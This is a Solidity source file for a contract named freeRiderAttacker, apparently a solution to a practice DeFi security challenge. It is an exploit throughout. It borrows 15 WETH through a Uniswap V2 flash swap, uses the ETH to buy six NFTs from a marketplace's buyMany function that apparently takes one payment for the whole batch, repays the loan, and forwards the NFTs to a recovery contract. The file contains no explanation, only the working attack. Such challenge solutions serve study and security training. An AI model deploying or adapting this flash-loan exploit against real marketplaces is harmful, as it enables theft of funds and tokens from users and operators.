// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address to, uint256 value) external returns (bool);
}

interface IMarketPlace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) external;
}

contract freeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    address private weth;
    address private uniswapPair;
    address private nftContract;
    address private recoverContract;
    address private marketPlace;

    receive() external payable {}

    constructor(address _weth, address _uniswapPair, address _nftContract, address _recoverContract, address _marketPlace) {
        weth = _weth;
        uniswapPair = _uniswapPair;
        nftContract = _nftContract;
        recoverContract = _recoverContract;
        marketPlace = _marketPlace;
    }

    function attack() external {
        bytes memory data = abi.encode(15 ether);
        IUniswapV2Pair(uniswapPair).swap(15 ether, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        IWETH(weth).withdraw(amount0);
        uint256[] memory tokenIDs;
        tokenIDs = new uint256[](6);
        tokenIDs[0] = 0;
        tokenIDs[1] = 1;
        tokenIDs[2] = 2;
        tokenIDs[3] = 3;
        tokenIDs[4] = 4;
        tokenIDs[5] = 5;
        uint256 amountToRepay = (amount0 * 103) / 100;
        IMarketPlace(marketPlace).buyMany{value: amount0}(tokenIDs);
        IWETH(weth).deposit{value: amountToRepay}();
        IWETH(weth).transfer(msg.sender, amountToRepay);
    }

    function transferNfts() external {
        uint256[] memory tokenIDs;
        tokenIDs = new uint256[](6);
        tokenIDs[0] = 0;
        tokenIDs[1] = 1;
        tokenIDs[2] = 2;
        tokenIDs[3] = 3;
        tokenIDs[4] = 4;
        tokenIDs[5] = 5;
        bytes memory data = abi.encode(msg.sender);
        for (uint256 i = 0; i < tokenIDs.length; i++) {
            IERC721(nftContract).safeTransferFrom(address(this), recoverContract, tokenIDs[i], data);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }


}
